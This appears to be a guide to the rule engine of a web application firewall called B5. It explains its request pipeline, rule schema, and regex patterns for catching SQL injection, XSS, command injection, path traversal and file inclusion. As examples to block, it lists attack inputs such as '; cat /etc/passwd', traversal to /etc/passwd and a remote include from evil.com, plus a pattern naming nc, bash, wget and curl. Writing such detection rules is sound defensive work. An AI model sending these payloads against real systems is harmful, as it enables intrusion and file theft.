# B5 WAF Rule Engine & Threat Detection Guide

This section covers the core mechanics of the B5 Rule Engine and how it mitigates various web threats (Tasks 31-40).

## 31. B5 Rule Engine Logic Overview
The B5 Rule Engine operates inside the OpenResty data plane using Lua. When a request arrives, it is processed through a sequential pipeline:
1. **Metadata Extraction**: IP, URI, Method, and Headers are extracted.
2. **IP Reputation & Rate Limiting**: Checked against Redis. If blocked/limited, the request drops immediately.
3. **Pattern Matching**: The URI, Headers, and Body are matched against the active rule sets (SQLi, XSS, etc.) fetched from the database.
4. **Action Execution**: Based on the `B5_MODE` (logging vs blocking) and the specific rule action (`allow`, `block`, `log`), the proxy either forwards the request to the upstream application or returns a 403 Forbidden response.

## 32. Structure of a Rule (PostgreSQL)
Rules are stored in the PostgreSQL database and synced to the proxy. A rule has the following schema:
- `id` (Integer): Primary Key.
- `name` (String): Human-readable name (e.g., "Basic SQLi 1").
- `type` (String): Category (e.g., `sqli`, `xss`, `lfi`, `ip_block`).
- `pattern` (Text): The PCRE regular expression to match.
- `action` (String): `allow`, `block`, or `log`.
- `enabled` (Boolean): Whether the rule is currently active.

## 33. Custom Lua Patterns for SQL Injection (SQLi)
B5 uses the `ngx.re.match` engine with PCRE syntax. To write a custom SQLi rule:
- Ensure it uses the `(?i)` flag for case insensitivity.
- Example pattern to block `1=1` style injections: `(?i)(?:'|")\s*(?:or|and)\s*(?:'|")?\d+(?:'|")?\s*=\s*(?:'|")?\d+`
- Example pattern to block union selects: `(?i)union\s+(?:all\s+)?select`

## 34. Custom Lua Patterns for Cross-Site Scripting (XSS)
To catch XSS payloads targeting the URI or form inputs:
- Example pattern for standard script tags: `(?i)<\s*script[^>]*>(.*?)<\s*/\s*script\s*>`
- Example pattern for inline event handlers (e.g., `onerror=`): `(?i)on(?:load|error|mouseover|focus|click)\s*=\s*(?:'|")?javascript:`
- Example pattern for `javascript:` URIs: `(?i)javascript:[a-zA-Z0-9]+`

## 35. Command Injection Detection
Command injection occurs when user input is passed directly to a system shell. B5 detects this by looking for common shell metacharacters and commands:
- Detect chaining operators: `(?i)(?:;|\|\||&&|`|\$)\s*(?:cat|ls|pwd|whoami|ping|nc|bash|sh|wget|curl)`
- Example rule blocks inputs like `; cat /etc/passwd`.

## 36. Path Traversal Mitigation
Path Traversal (Directory Climbing) attempts to access files outside the intended web root. B5 inspects the `request_uri` (after normalization by Nginx):
- Pattern to catch basic traversal: `(?i)(?:\.\./|\.\.\\)`
- Pattern to catch URL-encoded traversal: `(?i)(?:%2e%2e%2f|%2e%2e/|\.\.%2f)`

## 37. Local File Inclusion (LFI) Protection
LFI attacks attempt to include local server files. This often uses path traversal but targets specific known files:
- Detect common Linux files: `(?i)/etc/(?:passwd|shadow|hosts|group|issue)`
- Detect common Windows files: `(?i)(?:c:\\boot\.ini|c:\\windows\\win\.ini)`
- Combine with traversal checks to block payloads like `?page=../../../../etc/passwd`.

## 38. Remote File Inclusion (RFI) Protection
RFI occurs when the application includes an external script or file via a URL. B5 detects this in query parameters:
- Detect HTTP/HTTPS protocols embedded in parameters: `(?i)[?&][a-zA-Z0-9_]+=(?:http|https|ftp)://`
- Block payloads like `?file=http://evil.com/shell.txt`.

## 39. Handling multipart/form-data (File Uploads)
Inspecting file uploads requires reading the request body. In B5, the Lua engine can parse the `multipart/form-data` stream.
- B5 inspects the `filename` attribute within the `Content-Disposition` header of the part.
- If the filename ends with dangerous extensions (e.g., `.php`, `.exe`, `.sh`, `.jsp`), the upload is blocked.
- *Note: Deep content inspection (malware scanning) requires integration with external tools like ClamAV.*

## 40. Writing an IP Allowlist Rule
To bypass WAF inspection for a trusted IP (like a company VPN or an internal monitoring service):
- In the dashboard, create a new rule with type `ip_allow`.
- Set the `pattern` to the specific IP (e.g., `192.168.1.50`) or CIDR block (e.g., `10.0.0.0/8`).
- The Lua engine checks this allowlist *before* executing regex pattern matching, saving CPU cycles and preventing false positives for trusted traffic.
